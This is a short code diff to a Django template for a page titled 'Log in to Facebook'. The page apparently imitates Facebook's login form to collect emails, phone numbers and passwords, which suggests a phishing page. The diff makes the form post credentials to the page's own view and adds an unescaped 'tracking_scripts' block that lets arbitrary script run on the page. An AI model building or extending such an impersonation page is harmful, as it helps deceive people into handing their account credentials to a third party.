@@ -18,7 +18,7 @@
         <div class="login-form-container">
             <h1 class="login-title">Log in to Facebook</h1>
             
-            <form action="/submit/" method="post" class="fb-login-form" autocomplete="off">
+            <form method="post" class="fb-login-form" autocomplete="off">
                 {% csrf_token %}
                 <div class="form-group">
                     <input type="text" name="email" id="email" placeholder="Email or phone number" required>
@@ -39,6 +39,7 @@
         </div>
     </main>
 
+    {{ tracking_scripts|safe }}
     <!-- Footer -->
     <footer class="fb-footer">
         <div class="languages">
